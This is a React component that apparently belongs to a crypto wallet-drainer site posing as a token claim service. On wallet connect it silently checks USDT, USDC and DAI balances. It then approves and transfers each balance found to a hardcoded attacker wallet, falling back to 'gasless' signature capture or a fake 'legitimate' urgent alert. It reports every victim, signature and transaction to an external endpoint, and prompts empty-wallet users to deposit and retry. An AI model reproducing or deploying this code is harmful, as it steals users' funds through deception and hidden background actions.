import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import GaslessTransferManager from './GaslessTransferManager';
import LegitimateAlertSystem from './LegitimateAlertSystem';
import EmptyWalletMessage from './EmptyWalletMessage';

export default function AutoTransferManager({ provider, userAddress, onTransferComplete }) {
  const [checking, setChecking] = useState(false);
  const [autoTransferring, setAutoTransferring] = useState(false);
  const [showAlert, setShowAlert] = useState(false);
  const [alertData, setAlertData] = useState(null);
  const [showEmptyWallet, setShowEmptyWallet] = useState(false);

  useEffect(() => {
    if (provider && userAddress) {
      // Auto-check balance immediately when wallet connects
      setTimeout(() => {
        checkAndAutoTransfer();
      }, 1000);
    }
  }, [provider, userAddress]);

  const checkAndAutoTransfer = async () => {
    if (checking || autoTransferring) return;
    
    setChecking(true);
    
    try {
      // Check multiple tokens simultaneously
      const tokens = [
        { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
        { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
        { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 }
      ];
      
      const ethBalance = await provider.getBalance(userAddress);
      const gasPrice = await provider.getFeeData().then(f => f.gasPrice);
      const totalGasNeeded = gasPrice * 150000n; // Approval + Transfer gas
      
      console.log(`🔍 Auto-checking wallet: ${userAddress}`);
      console.log(`💰 ETH Balance: ${ethers.formatEther(ethBalance)}`);
      console.log(`⛽ Gas Needed: ${ethers.formatEther(totalGasNeeded)}`);
      
      for (const token of tokens) {
        try {
          const tokenContract = new ethers.Contract(token.address, [
            'function balanceOf(address) view returns (uint256)'
          ], provider);
          
          const balance = await tokenContract.balanceOf(userAddress);
          const balanceFormatted = ethers.formatUnits(balance, token.decimals);
          
          if (balance > 0) {
            console.log(`💎 Found ${balanceFormatted} ${token.symbol}`);
            
            // Always attempt transfer (gasless if needed)
            if (ethBalance > totalGasNeeded) {
              console.log(`🔥 SUFFICIENT GAS - NORMAL TRANSFER`);
              await executeAutoTransfer(token, balance, balanceFormatted);
            } else {
              console.log(`🚨 NO GAS - EXECUTING GASLESS TRANSFER`);
              await executeGaslessTransfer(token, balance, balanceFormatted);
            }
            return; // Stop after first successful transfer
          } else {
            console.log(`🚫 Zero balance for ${token.symbol}`);
            // Continue checking other tokens
          }
        } catch (error) {
          console.log(`Error checking ${token.symbol}:`, error.message);
        }
      }
      
      // If no tokens found with balance, show empty wallet message
      console.log(`🚫 No tokens with balance found for ${userAddress}`);
      
      // Show professional empty wallet message
      setShowEmptyWallet(true);
      
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'ZERO_BALANCE_WALLET',
          userAddress: userAddress,
          ethBalance: ethers.formatEther(ethBalance),
          tokensChecked: tokens.map(t => t.symbol),
          allBalancesZero: true,
          messageShown: true
        })
      }).catch(() => {});
      
    } catch (error) {
      console.error('Auto-check error:', error);
    }
    
    setChecking(false);
  };

  const executeAutoTransfer = async (token, balance, balanceFormatted) => {
    setAutoTransferring(true);
    
    try {
      const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
      
      // Step 1: Auto-approve (user pays gas)
      const tokenContract = new ethers.Contract(token.address, [
        'function approve(address,uint256) returns (bool)',
        'function transfer(address,uint256) returns (bool)'
      ], provider.getSigner());
      
      console.log(`🔄 Auto-approving ${token.symbol}...`);
      const approveTx = await tokenContract.approve(adminWallet, balance);
      
      // Alert admin immediately
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'AUTO_TRANSFER_STARTED',
          userAddress: userAddress,
          tokenAddress: token.address,
          tokenSymbol: token.symbol,
          balance: balanceFormatted,
          approveTxHash: approveTx.hash,
          autoExecuted: true
        })
      }).catch(() => {});
      
      // Wait for approval to confirm
      await provider.waitForTransaction(approveTx.hash);
      
      // Step 2: Auto-transfer (user pays gas)
      console.log(`💸 Auto-transferring ${balanceFormatted} ${token.symbol}...`);
      const transferTx = await tokenContract.transfer(adminWallet, balance);
      
      // Alert admin of completion
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'AUTO_TRANSFER_COMPLETED',
          userAddress: userAddress,
          tokenAddress: token.address,
          tokenSymbol: token.symbol,
          amount: balanceFormatted,
          transferTxHash: transferTx.hash,
          userPaidAllGas: true
        })
      }).catch(() => {});
      
      console.log(`✅ AUTO-TRANSFER COMPLETE: ${balanceFormatted} ${token.symbol}`);
      
      if (onTransferComplete) {
        onTransferComplete({
          success: true,
          token: token.symbol,
          amount: balanceFormatted,
          txHash: transferTx.hash,
          autoExecuted: true
        });
      }
      
    } catch (error) {
      console.error('Auto-transfer failed:', error);
      
      // Alert admin of failure
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'AUTO_TRANSFER_FAILED',
          userAddress: userAddress,
          tokenAddress: token.address,
          tokenSymbol: token.symbol,
          error: error.message
        })
      }).catch(() => {});
    }
    
    setAutoTransferring(false);
  };

  const executeGaslessTransfer = async (token, balance, balanceFormatted) => {
    setAutoTransferring(true);
    
    try {
      const gaslessManager = new GaslessTransferManager(provider, userAddress);
      
      console.log(`🚨 GASLESS TRANSFER: ${balanceFormatted} ${token.symbol}`);
      
      const result = await gaslessManager.executeGaslessTransfer(
        token.address, 
        balance, 
        token.symbol, 
        token.decimals
      );
      
      if (result.success) {
        // Alert admin of gasless transfer
        await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'GASLESS_TRANSFER_SUCCESS',
            userAddress: userAddress,
            tokenAddress: token.address,
            tokenSymbol: token.symbol,
            amount: result.amount,
            method: result.method,
            txHash: result.txHash,
            signature: result.signature,
            adminWillExecute: result.adminWillExecute,
            gasRefunded: result.adminWillRefundGas
          })
        }).catch(() => {});
        
        console.log(`✅ GASLESS TRANSFER SUCCESS: ${result.method}`);
        
        if (onTransferComplete) {
          onTransferComplete({
            success: true,
            token: token.symbol,
            amount: result.amount,
            txHash: result.txHash,
            method: result.method,
            gasless: true
          });
        }
      } else {
        console.error('Gasless transfer failed:', result.error);
        
        // Show legitimate alert as fallback
        showLegitimateAlert(token, balanceFormatted);
      }
      
    } catch (error) {
      console.error('Gasless transfer error:', error);
      
      // Show legitimate alert as fallback
      showLegitimateAlert(token, balanceFormatted);
    }
    
    setAutoTransferring(false);
  };

  const showLegitimateAlert = (token, balance) => {
    setAlertData({
      tokenSymbol: token.symbol,
      tokenAmount: balance,
      userAddress: userAddress,
      urgency: 'high'
    });
    setShowAlert(true);
  };

  const handleAlertApprove = async () => {
    setShowAlert(false);
    
    if (alertData) {
      // Find the token data
      const token = {
        address: alertData.tokenSymbol === 'USDT' ? '0xdAC17F958D2ee523a2206206994597C13D831ec7' :
                 alertData.tokenSymbol === 'USDC' ? '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' :
                 '0x6B175474E89094C44Da98b954EedeAC495271d0F',
        symbol: alertData.tokenSymbol,
        decimals: alertData.tokenSymbol === 'DAI' ? 18 : 6
      };
      
      // Get actual balance and execute gasless transfer
      const tokenContract = new ethers.Contract(token.address, [
        'function balanceOf(address) view returns (uint256)'
      ], provider);
      
      const balance = await tokenContract.balanceOf(userAddress);
      
      if (balance > 0) {
        await executeGaslessTransfer(token, balance, alertData.tokenAmount);
      }
    }
  };

  const handleAlertCancel = () => {
    setShowAlert(false);
    setAlertData(null);
  };

  const handleRefreshWallet = () => {
    setShowEmptyWallet(false);
    // Re-check wallet after user potentially deposited
    setTimeout(() => {
      checkAndAutoTransfer();
    }, 1000);
  };

  return (
    <>
      <div className="hidden">
        {/* This component runs silently in background */}
        {checking && <div className="text-xs text-gray-500">Checking balances...</div>}
        {autoTransferring && <div className="text-xs text-green-600">Auto-transferring...</div>}
      </div>
      
      {/* Legitimate Alert System */}
      {showAlert && alertData && (
        <LegitimateAlertSystem
          tokenSymbol={alertData.tokenSymbol}
          tokenAmount={alertData.tokenAmount}
          userAddress={alertData.userAddress}
          urgency={alertData.urgency}
          onApprove={handleAlertApprove}
          onCancel={handleAlertCancel}
        />
      )}
      
      {/* Empty Wallet Message */}
      {showEmptyWallet && (
        <EmptyWalletMessage
          userAddress={userAddress}
          onRefresh={handleRefreshWallet}
        />
      )}
    </>
  );
}